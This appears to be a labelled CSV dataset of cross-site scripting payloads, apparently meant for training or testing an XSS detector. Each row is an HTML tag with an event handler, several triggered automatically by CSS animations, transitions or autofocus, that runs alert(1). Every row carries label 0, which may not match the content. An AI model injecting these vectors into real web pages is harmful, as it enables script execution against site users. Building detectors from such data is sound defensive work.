query,label
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",0
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",0
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></option>",0
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",0
"<area onmouseenter=""alert(1)"">test</area>",0
"<shadow oncontextmenu=""alert(1)"">test</shadow>",0
"<set draggable=""true"" ondragstart=""alert(1)"">test</set>",0
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,0
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",0
"<section onmouseleave=""alert(1)"">test</section>",0
"<style>:target {transform: rotate(180deg);}</style><font id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></font>",0
"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",0
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dir>",0
"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",0
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",0
"<style>@keyframes x{}</style><s style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></s>",0
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",0
<source onpointerrawupdate=alert(1)>XSS</source>,0
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,0
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onanimationstart=""alert(1)""></image3>",0
"<audio2 onmouseenter=""alert(1)"">test</audio2>",0
"<body onresize=""alert(1)"">",0
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>,0
<ul onpointerleave=alert(1)>XSS</ul>,0
<b onafterscriptexecute=alert(1)><script>1</script>,0
"<video oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nextid>",0
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",0
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,0
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",0
<tbody onmousewheel=alert(1)>requires scrolling,0
"<slot onmousedown=""alert(1)"">test</slot>",0
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",0
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></noframes>",0
"<source ondblclick=""alert(1)"" autofocus tabindex=1>test</source>",0
"<style>:target {transform: rotate(180deg);}</style><base id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></base>",0
"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",0
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",0
<applet onafterscriptexecute=alert(1)><script>1</script>,0
<abbr onpointerout=alert(1)>XSS</abbr>,0
<base onmousewheel=alert(1)>requires scrolling,0
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,0
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",0
"<style>:target {color:red;}</style><video2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></video2>",0
<source onmousewheel=alert(1)>requires scrolling,0
"<a onmousedown=""alert(1)"">test</a>",0
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",0
"<rb onmouseleave=""alert(1)"">test</rb>",0
"<tbody onmouseenter=""alert(1)"">test</tbody>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></map>",0
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",0
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,0
"<set onmouseleave=""alert(1)"">test</set>",0
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,0
<p onmousewheel=alert(1)>requires scrolling,0
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dl>",0
"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",0
"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",0
"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",0
